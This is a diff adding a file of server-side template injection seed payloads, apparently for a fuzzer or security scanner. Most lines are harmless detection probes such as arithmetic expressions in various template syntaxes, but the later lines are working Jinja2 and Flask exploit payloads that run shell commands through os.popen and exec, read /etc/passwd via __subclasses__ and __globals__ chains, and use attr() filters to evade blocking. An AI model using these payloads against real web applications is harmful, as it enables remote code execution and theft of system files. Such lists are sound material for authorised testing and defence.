@@ -1,0 +1,74 @@
+# SSTI Seed Payloads
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{self}}
+{{request}}
+{{session}}
+{{app}}
+{{g}}
+{{url_for}}
+{{get_flashed_messages}}
+${7*7}
+#{7*7}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{config.__class__.__init__.__globals__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__bases__}}
+{{()|attr('__class__')}}
+{{request|attr('application')}}
+{{request.environ}}
+{{request.headers}}
+{{request.cookies}}
+{{request.args}}
+{{request.form}}
+{php}echo 49;{/php}
+{$smarty.version}
+{7*7}
+${7*7}
+#set($x=7*7)$x
+{{constructor}}
+{{__proto__}}
+{{this}}
+${{7*7}}
+@@7*7@@
+#{7*7}
+{{= 7*7 }}
+{{=7*7}}
+[$7*7$]
+{{7*7}}
+{{7e7}}
+{7*7}
+#{7*7}
+*{7*7}
+{=7*7}
+{{= 7*7 =}}
+${7*7}
+${{7*7}}
+@@7*7@@
+{{'7'*7}}
+{{"7"*7}}
+{%if 1==1%}yes{%endif%}
+${7+7}
+{{7+7}}
+<%= 7*7 %>
+${{7*7}}
+{{7*7|safe}}
+{{7*7|escape}}
+{{7*7|e}}
+{% set a = 7*7 %}{{a}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{config.__class__.__init__.__globals__.os.popen('id').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{self.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{request.application.__self__._get_data.__globals__.__builtins__.exec('import os;os.system("id")')}}
+{{config.__class__.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}
+{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
+{{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}
+{{(config|string|attr('__class__'))}}
+{{(config|attr('__class__'))}}
+{{(dict)|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
+{{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
